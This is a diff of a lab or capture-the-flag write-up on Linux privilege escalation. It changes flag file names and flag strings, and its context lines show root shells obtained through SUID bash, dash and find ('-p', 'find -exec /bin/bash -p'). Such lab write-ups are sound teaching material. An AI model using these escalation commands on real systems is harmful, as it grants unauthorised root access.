@@ -155,13 +155,13 @@ The `-p` flag instructs the bash interpreter not to drop privileges, ensuring th
 
 ```bash
 whoami         # root
-cat /root/flag_etc.txt
+cat /root/flag_bash.txt
 ```
 
 The first flag is successfully retrieved:
 
 ```
-FLAG-WRITEABLE-PASSWD-2025
+FLAG-SUID-BASH-2025
 ```
 
 👉 **Insert Screenshot #2: `/bin/bash -p` + `whoami` + first flag**
@@ -175,7 +175,7 @@ The Bourne-Again Shell's counterpart, Dash, behaves similarly in this misconfigu
 ```bash
 /bin/dash -p
 whoami
-cat /root/flag2.txt
+cat /root/flag_dash.txt
 ```
 
 This results in the second root shell and the collection of the second flag:
@@ -201,7 +201,7 @@ The exploitation involves instructing `find` to execute a shell using its elevat
 ```bash
 /usr/bin/find . -exec /bin/bash -p \; -quit
 whoami
-cat /root/flag3.txt
+cat /root/flag_find.txt
 ```
 
 The third flag is collected, completing the challenge as designed for the web version:
